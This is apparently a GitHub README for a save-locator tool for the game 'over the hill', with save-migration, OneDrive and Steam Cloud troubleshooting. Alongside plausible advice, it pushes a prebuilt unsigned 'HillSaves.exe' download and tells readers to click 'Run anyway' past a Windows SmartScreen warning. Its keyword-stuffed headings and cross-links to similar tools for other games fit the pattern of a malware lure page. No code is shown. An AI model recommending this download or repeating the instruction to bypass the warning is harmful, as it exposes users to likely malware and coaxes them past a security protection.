# over the hill Save Location — Missing Progress, OneDrive and Steam Cloud

<p align="center">
  <img src="https://i.postimg.cc/FzStBV0Y/banner.png" alt="over the hill — Save Locator for Windows PC" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Save%20Migration%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-hill--path--2.7-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

**Windows PC · over the hill · Save and troubleshooting documentation**

If *over the hill* opens as though you have never played, first determine **where the save was written**. The developers reported cases involving Windows Defender, OneDrive and the Documents directory. Players saw apparently reset progress even though files had been saved elsewhere.

There is a crucial update: on **17 November 2026**, the developers introduced an **in-game migration to a new save location**. The game is intended to move existing data automatically after the update. This guide is for checking the old and new copies when the migration does not produce the progress you expected; it is not a replacement for the built-in migration.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Game launches as if you have never played | Nov 17, 2026 save-location migration or OneDrive `Documents` split | Compare `Documents\My Games\over the hill`, `OneDrive`, and new save path |
| Progress appears on one PC but not another | Steam Cloud sync incomplete or mismatched Steam account | Wait for Steam Cloud sync and back up both local folders first |
| Defender or Controlled Folder Access blocking writes | Windows security blocking writes to user `Documents` | Check Windows Security protection history without disabling Defender |
| Importing an older backup overwrites migrated save | Copying old `My Games` files blindly over post-Nov 17 saves | Inspect timestamps in both locations before copying |

## Download for Windows

[**Download HillSaves.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/HillSaves.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `HillSaves.exe`? (Automatic checks in ~2 seconds)

- Scans both `%USERPROFILE%\Documents` and `%USERPROFILE%\OneDrive\Documents` for legacy `over the hill` saves.
- Checks the post-November 17, 2026 migrated save location in `AppData` / Steam `userdata` (`2929250`).
- Compares modification timestamps and file sizes side-by-side so you don't overwrite newer progress.
- Leaves Windows Defender intact and never modifies game binaries.

### Sample Diagnostic Output

```text
[HillSaves] Locating over the hill legacy & post-Nov 17 migrated saves...
[INFO] Legacy Documents : C:\Users\Player\OneDrive\Documents\My Games\over the hill (Found, Nov 14)
[OK]   Migrated Path    : C:\Users\Player\AppData\LocalLow\over the hill\Saves (Found, Nov 19)
[OK]   Steam Cloud Dir  : D:\Steam\userdata\41299104\2929250\remote (3 files)
```

The link downloads the ZIP file attached to the latest GitHub Release, rather than opening the Releases page.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `HillSaves.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Install and run

1. Download **HillSaves.zip** using the link above.
2. Right-click the downloaded archive and choose **Extract All**.
3. Open the extracted folder and start **HillSaves.exe**.
4. Review the program’s options before applying changes to game files, saves, or Windows settings.
5. Launch the game again and check whether the original problem remains.

Close the game before working with its save files. If Windows displays a security warning, check the file and its publisher instead of disabling protection.

## When this guide applies

- Your garage or exploration progress looks reset after a restart.
- Progress appears on one Windows device but not another.
- Files exist under a OneDrive-backed Documents folder, but the game shows a different session.
- The game updated, and you want to check whether your earlier saves were migrated.

## Before changing anything

Update *over the hill* through Steam and launch it normally once. Let the game complete its own migration and cloud-sync work before making any manual changes. Close the game before copying folders. Do not disable Windows Security or give broad write permissions to the entire Documents directory just to test a save problem.

## What to check

Older installations can have data below a Documents / `My Games / over the hill` path, including a OneDrive-backed Documents folder. Look in your current user's Documents, OneDrive Documents if configured, and any backup you previously made. The **new active save location can differ after the November update**, so do not assume the old path remains writable or current.

Compare dates, profiles and the progress you see in-game. Copy candidate folders to a separate backup location rather than moving the originals. If Steam Cloud is involved, check that you are using the same Steam account and that synchronization has finished. Importing files blindly can replace a newer migrated save.

## What this project covers

The repository focuses on **over the hill save location**, **lost progress**, and **Steam Cloud save mismatch** diagnosis. It is not intended to replace the developer's new migration feature, bypass Windows Defender, or edit the format of the game's saved progress.

## Troubleshooting

### Old save is in OneDrive Documents

Keep a copy and check the latest game version first. Identify the new active location before attempting any transfer.

### Cloud data differs across computers

Confirm the same Steam account, wait for sync to complete and make a backup on each device before resolving any conflict.

### Progress looks reset after updating

Do not start a long new session immediately. Check the developer notes and locate older files before playing further.

## Frequently asked questions

**Did the developers already fix this?**

They shipped a save-location migration on 17 November 2026; unresolved cases still need to be diagnosed individually.

**Does the utility turn off Defender?**

No. The goal is to locate and preserve files, not weaken system security.

**Can it combine two different worlds?**

No reliable automatic merge is documented here.

## Sources and game updates

These links are useful for checking whether a symptom is still present on the latest patch.
- [Developer announcement: Important Changes to Save Data Location](https://steamcommunity.com/app/2929250/announcements/detail/1846651706674745)
- [over the hill on Steam](https://store.steampowered.com/app/2929250/over_the_hill/)

## More Windows Game Diagnostic Tools

- [FM27-SavePathCheck](../FM27-SavePathCheck) — Football Manager 27 `Documents` & OneDrive save path locator
- [Enshrouded-WorldMigrationGuard](../Enshrouded-WorldMigrationGuard) — Enshrouded 1.0 world save migration & backup guard
- [Dreadmoor-SaveCheck](../Dreadmoor-SaveCheck) — DREADMOOR missing save & progress rollback diagnostics
- [MoonSweepers-SaveVault](../MoonSweepers-SaveVault) — Moon Sweepers `MoonSessions` save backup utility

## Disclaimer

This is an independent community project for over the hill players and is not an official release from the game developer or publisher. A missing save, server outage or internal game bug may not be repairable by third-party software.
 
 
 
 
 
 
 
